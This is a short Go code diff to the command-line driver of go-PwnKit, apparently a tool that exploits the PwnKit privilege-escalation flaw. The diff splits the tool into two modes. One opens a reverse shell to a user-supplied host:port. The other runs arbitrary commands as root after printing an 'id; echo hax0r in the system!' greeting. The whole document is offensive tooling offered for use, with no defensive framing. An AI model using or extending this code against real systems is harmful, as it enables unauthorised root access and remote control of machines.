@@ -2,7 +2,7 @@ package main
 
 import (
 	"flag"
-	gopwnkit "github.com/OXDBXKXO/go-PwnKit"
+	"github.com/OXDBXKXO/go-PwnKit"
 )
 
 func main() {
@@ -11,9 +11,11 @@ func main() {
 	reverseShell := flag.String("r", "", "Optionally open a reverse-shell instead. Format: host:port")
 	flag.Parse()
 
-	if *greetings {
-		gopwnkit.Escalate("id; echo \"hax0r in the system!\";"+*cmd, *reverseShell)
+	if *reverseShell != "" {
+		gopwnkit.RevShell(*reverseShell)
+	} else if *greetings {
+		gopwnkit.Command("id; echo \"hax0r in the system!\";" + *cmd)
 	} else {
-		gopwnkit.Escalate(*cmd, *reverseShell)
+		gopwnkit.Command(*cmd)
 	}
 }
